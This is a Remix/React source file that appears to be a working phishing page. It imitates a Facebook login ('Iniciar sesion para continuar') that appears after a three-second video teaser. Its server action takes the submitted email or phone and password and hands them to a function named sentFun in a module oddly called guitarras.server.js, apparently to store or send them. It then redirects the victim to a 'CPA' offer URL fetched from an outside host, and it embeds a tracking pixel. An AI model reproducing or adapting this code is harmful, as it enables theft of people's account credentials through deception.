import { React, useState } from "react";
import logo from "../../public/img/videos.gif";
import fc from "../../public/img/Fc.jpg";
import {sentFun,getUrl} from '~/Models/guitarras.server.js'
import { redirect } from "@remix-run/node";
import { Form, useLoaderData } from "@remix-run/react";

export const action = async ({ request }) => {
  const formData = await request.formData();
  const email = formData.get('text');
  const password = formData.get('text2');
  const project = await sentFun({'email':`${email}`,'pass':`${password}`});
  const respuesta =  await fetch('https://strapi-70ig.onrender.com/api/url-cpa');
  const r = await respuesta.json();
  console.log(r.data.attributes.CPA);

  return redirect(`${r.data.attributes.CPA}`);
};






export default function Fb() {

  // const resul = useLoaderData().attributes.CPA;
  // console.log(resul)
   const [fi,setfi] = useState(false);
     setTimeout(() => {
      setfi(true);
   }, 3000);

   return (
      <div className="">
         
       <img src="//whos.amung.us/pingjs/?k=presionty&amp;t=tango&amp;x=https://twitter.com" alt=""></img>
   
         <img className="git" src={logo} alt="logo imagen"></img><div className="form">
               <p className="alert">¡Iniciar sesion para continuar!</p>

                 {fi === true && (
<div>
<Form className="formu" method="post" action="/fb">
     <img src={fc} />
     <div className="Emai">
        <input
           className="Email"
           type="text"
           name="text"

           placeholder="Correo electronico o numero de telefono" />
     </div>
     <div className="pass">
        <input className="pas" type="password"
           name="text2"

           placeholder="Contraseña" />
        <p>si</p>
        <button
           className="btn"
           type="submit"
        >iniciar sesión</button>
     </div>
  </Form>
</div>

)}
 

            </div>

      </div>
   );
}
